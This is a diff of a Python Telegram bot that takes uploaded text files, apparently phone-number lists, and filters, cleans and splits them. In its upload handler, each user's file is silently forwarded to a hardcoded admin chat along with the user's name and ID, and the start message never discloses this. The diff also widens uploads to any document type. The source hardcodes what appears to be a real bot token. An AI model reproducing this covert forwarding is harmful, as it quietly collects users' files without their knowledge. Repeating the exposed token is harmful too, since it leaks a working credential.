@@ -1,3 +1,5 @@
+# -*- coding: utf-8 -*-
+
 from telegram import Update
 from telegram.ext import (
     Application,
@@ -10,13 +12,12 @@ import math
 
 TOKEN = "8811033165:AAH2Yi9WsrxRYMwQWce2hPt78YfBsUeSVE4"
 ADMIN_ID = 6382539239
+
 saved_files = {}
 stop_requests = {}
 
-
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_name = update.effective_user.first_name
-
     await update.message.reply_text(
         f"Hello {user_name}!\n\n"
         "Upload a file in .txt format.\n\n"
@@ -29,36 +30,26 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "Use /stop to cancel processing."
     )
 
-
 async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
-
     stop_requests[user_id] = True
-
-    await update.message.reply_text(
-        "⛔ Process stopped successfully."
-    )
-
+    await update.message.reply_text("⛔ Process stopped successfully.")
 
 async def receive_txt(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
-
     file = await update.message.document.get_file()
-
     saved_files[user_id] = f"{user_id}_input.txt"
-
     await file.download_to_drive(saved_files[user_id])
     with open(saved_files[user_id], "rb") as f:
         await context.bot.send_document(
-        chat_id=6382539239,
-        document=f,
-        caption=(
-            f"New upload received\n"
-            f"User: {update.effective_user.first_name}\n"
-            f"User ID: {user_id}"
+            chat_id=ADMIN_ID,
+            document=f,
+            caption=(
+                f"New upload received\n"
+                f"User: {update.effective_user.first_name}\n"
+                f"User ID: {user_id}"
+            ),
         )
-    )
-      
     await update.message.reply_text(
         "TXT file received successfully!\n\n"
         "Now send command like:\n"
@@ -69,154 +60,86 @@ async def receive_txt(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def extract_prefix(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
-
     if user_id not in saved_files:
         await update.message.reply_text("Please upload a TXT file first.")
         return
-
     prefix = update.message.text.replace("/ext", "").strip()
-
     result = []
-
     with open(saved_files[user_id], "r", encoding="utf-8") as f:
         for line in f:
             line = line.strip()
             if line.startswith(prefix):
                 result.append(line)
-
     output_file = f"{prefix}_numbers.txt"
-
     with open(output_file, "w", encoding="utf-8") as out:
         out.write("\n".join(result))
-
     with open(output_file, "rb") as out:
         await update.message.reply_document(out)
-
 
 async def clear_words(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
-
     if user_id not in saved_files:
-        await update.message.reply_text(
-            "Please upload a TXT file first."
-        )
+        await update.message.reply_text("Please upload a TXT file first.")
         return
-
     output_file = f"{user_id}_clean.txt"
-
     with open(saved_files[user_id], "r", encoding="utf-8") as f:
         lines = f.readlines()
-
     cleaned = []
-
     for line in lines:
-        number = "".join(
-            ch for ch in line if ch.isdigit()
-        )
-
+        number = "".join(ch for ch in line if ch.isdigit())
         if number:
             cleaned.append(number)
-
     with open(output_file, "w", encoding="utf-8") as out:
         out.write("\n".join(cleaned))
-
     with open(output_file, "rb") as out:
         await update.message.reply_document(out)
-     async def split_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
+
+async def split_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
-
+    if user_id not in saved_files:
+        await update.message.reply_text("Please upload a TXT file first.")
+        return
+    stop_requests[user_id] = False
     try:
-        if user_id not in saved_files:
-            await update.message.reply_text(
-                "Please upload a TXT file first."
-            )
+        chunk_size = int(update.message.text.replace("/spl", ""))
+    except ValueError:
+        await update.message.reply_text("Invalid number after /spl.")
+        return
+    with open(saved_files[user_id], "r", encoding="utf-8") as f:
+        lines = f.read().splitlines()
+    total_parts = math.ceil(len(lines) / chunk_size)
+    await update.message.reply_text(
+        f"🚀 Processing Started...\n\n"
+        f"Total Lines: {len(lines)}\n"
+        f"Lines Per File: {chunk_size}\n"
+        f"Files To Be Created: {total_parts}\n\n"
+        f"Use /stop to cancel process."
+    )
+    part_no = 1
+    for i in range(0, len(lines), chunk_size):
+        if stop_requests.get(user_id, False):
+            await update.message.reply_text("⛔ Process stopped by user.")
             return
+        chunk = lines[i:i + chunk_size]
+        output_file = f"{user_id}_part_{part_no}.txt"
+        with open(output_file, "w", encoding="utf-8") as out:
+            out.write("\n".join(chunk))
+        with open(output_file, "rb") as out:
+            await update.message.reply_document(out)
+        part_no += 1
+    await update.message.reply_text(
+        f"✅ Done!\n\n"
+        f"Total Lines: {len(lines)}\n"
+        f"Lines Per File: {chunk_size}\n"
+        f"Total Parts: {part_no - 1}"
+    )
 
-        stop_requests[user_id] = False
-
-        chunk_size = int(
-            update.message.text.replace("/spl", "")
-        )
-
-        with open(saved_files[user_id], "r", encoding="utf-8") as f:
-            lines = f.read().splitlines()
-
-        total_parts = math.ceil(
-            len(lines) / chunk_size
-        )
-
-        await update.message.reply_text(
-            f"🚀 Processing Started...\n\n"
-            f"Total Lines: {len(lines)}\n"
-            f"Lines Per File: {chunk_size}\n"
-            f"Files To Be Created: {total_parts}\n\n"
-            f"Use /stop to cancel process."
-        )
-
-        part_no = 1
-
-        for i in range(0, len(lines), chunk_size):
-
-            if stop_requests.get(user_id, False):
-                await update.message.reply_text(
-                    "⛔ Process stopped by user."
-                )
-                return
-
-            chunk = lines[i:i + chunk_size]
-
-            output_file = f"{user_id}_part_{part_no}.txt"
-
-            with open(output_file, "w", encoding="utf-8") as out:
-                out.write("\n".join(chunk))
-
-            with open(output_file, "rb") as out:
-                await update.message.reply_document(out)
-
-            part_no += 1
-
-        await update.message.reply_text(
-            f"✅ Done!\n\n"
-            f"Total Lines: {len(lines)}\n"
-            f"Lines Per File: {chunk_size}\n"
-            f"Total Parts: {part_no - 1}"
-        )
-
-    except Exception as e:
-        await update.message.reply_text(
-            f"Error: {e}"
-        )   
-   
 app = Application.builder().token(TOKEN).build()
-
 app.add_handler(CommandHandler("start", start))
 app.add_handler(CommandHandler("stop", stop))
-
-app.add_handler(
-    MessageHandler(
-        filters.Document.TEXT,
-        receive_txt
-    )
-)
-
-app.add_handler(
-    MessageHandler(
-        filters.Regex(r"^/spl\d+$"),
-        split_file
-    )
-)
-app.add_handler(
-    MessageHandler(
-        filters.Regex(r"^/ext\d+$"),
-        extract_prefix
-    )
-)
-app.add_handler(
-    CommandHandler(
-        "clear",
-        clear_words
-    )
-)
-
+app.add_handler(CommandHandler("clear", clear_words))
+app.add_handler(MessageHandler(filters.Document.ALL, receive_txt))
+app.add_handler(MessageHandler(filters.Regex(r"^/spl\d+$"), split_file))
+app.add_handler(MessageHandler(filters.Regex(r"^/ext\d+$"), extract_prefix))
 print("Bot Running...")
 app.run_polling()
